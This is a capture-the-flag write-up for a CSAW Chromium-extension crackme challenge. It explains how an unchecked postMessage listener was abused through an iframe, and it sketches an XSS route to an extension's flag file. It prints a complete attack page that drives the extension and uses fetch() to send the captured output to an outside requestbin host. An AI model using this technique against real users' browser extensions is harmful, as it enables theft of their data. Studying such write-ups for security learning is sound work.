# Easiest crackme - 200

## About the challenge
We were given a Chromium plugin and we were told the target had the same on their system.
The plugin contained three different flags, progressing in difficulty.

The plugin basically connected a crackme (inside the plugin’s folder) and attached gdb to it. When given the correct password it would give you the flag.
We also were given a page to send a link to the target and a webservice to verify the crackme’s password.

## Getting the first flag
To get the flag, we needed to first get the password for the crackme.
Upon inspection with Ghidra we discovered the password was “web2hard”, and when sent to the webservice (crackme.web.chal.csaw.io) the plugin responded with the fake-flag that was given us (thus confirming it was correct).

### How do we get the real flag from the target?
In a normal situation we would’ve simply created a webpage to trick the target’s plugin in spewing out the flag, but we had some limitations here.
```
"content_scripts": [
        {
            "matches": ["http://crackme.web.chal.csaw.io/"],
            "run_at": "document_start",
            "js": ["app.js"],
            "all_frames" :true
        }
    ],
    "web_accessible_resources":["api.js"],
```

Looking at the plugin’s manifest we noticed that the script responsible for the debugging was injected only on http://crackme.web.chal.csaw.io/. 
This meant we couldn’t simply make a page and trigger the plugin.
As you can notice from the code, api.js was accessible but it didn’t work without app.js.
We searched methods to bypass fool Chromium into thinking we were in the right page without success.

So we looked around in the code and found that the plugin sent data around using postmessage, even the flag!
The fact that it sent data using “*” as a target origin and it didn’t check the origin of the postmessage(while listening on "message") confirmed this was the right path.
```
function send_to_app(msg) {
  return new Promise(resolve => {
    msg.id = msg_id;
    msg.from = 'page';
    messages[msg_id++] = resolve;
    window.postMessage(msg, '*');
  });
}
```

```
window.addEventListener("message", function(event) {
  let msg = event.data;
  if (msg.id === undefined || msg.from !== "extension")
    return;
  messages[msg.id](msg);
});
```

### How can we communicate via postmessage?
There was no way to communicate with other pages via this method. 
But turns out that iframes can communicate with their parent pages through window.postmessage, this meant that including the webservice with an iframe would effectively bypass the manifest’s check!
We then wrote a webpage that would send the resulting output to our Requestbin.
```
<html>
	<head>
		<script type="text/javascript">
			window.onload = function () {
				var myiframe = document.getElementById("myiframe").contentWindow;
				msg = {};
				msg.id = 1;
				msg.from = 'page';
				msg.type = 'start';
				msg.args = ['web2hard'];
				myiframe.postMessage(msg, '*');
				setTimeout(() => {
					msg = {};
					msg.id = 2;
					msg.from = 'page';
					msg.type = 'run';
					myiframe.postMessage(msg, '*');
				}, 5000);

				console.stdlog = console.log.bind(console);
				console.logs = [];
				console.log = function () {
					console.logs.push(Array.from(arguments));
					console.stdlog.apply(console, arguments);
					fetch(`https://xxxxxxxxx.x.pipedream.net?${JSON.stringify(console.logs[1][0].data.output)}`);
				}

				window.addEventListener("message", displayMessage, false);
			}
			function displayMessage(evt) {
				console.log(evt);
			}
		</script>
	</head>
	<body>
		<iframe id="myiframe" src="http://crackme.web.chal.csaw.io/">
	</body>
</html>
```
And sure enough here’s our flag!
>Congrats! Here is your flag: flag{post_msg_delivers_flag}

## Some words on the second flag
To get the second flag we had to be able to get a XSS. Why?
Because the flag was contained in the plugin as a simple text file .
Files inside plugins are accessible like normal URLs, so visiting chrome-extension://dhmimogfeikijkmaadppammcbjflkpof/flag2.txt would actually give us the flag.
We didn’t get the second flag during the competition because we couldn’t find where to reflect to get a XSS.
In retrospection it was actually really easy since there was only one input (the password) and it reflected in the plugin’s debugger page (since strings appearing in the stack where printed).
We could even control the debugger via some specific commands sent via postmessage, allowing us to break at the point we needed to print our XSS payload.
This means that we could’ve wrote a script that simply accessed the URL and sent the results to our Requestbin.

##### Moral of the story: Think of every place where your input can reflect!
